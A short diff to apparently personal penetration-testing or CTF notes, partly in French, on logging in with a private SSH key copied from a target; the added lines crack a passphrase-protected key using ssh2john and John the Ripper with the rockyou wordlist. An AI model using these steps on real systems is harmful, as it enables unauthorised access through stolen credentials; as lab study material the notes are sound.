@@ -8,3 +8,6 @@ Copie id_rsa dans machine attackant
 Machine attackant
 > chmod 600 id_rsa
 > ssh -i id_rsa <user>@<ip>
+  if id_rsa protected by a passphrase:
+    > ssh2john id_rsa > ssh.hash
+    > john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
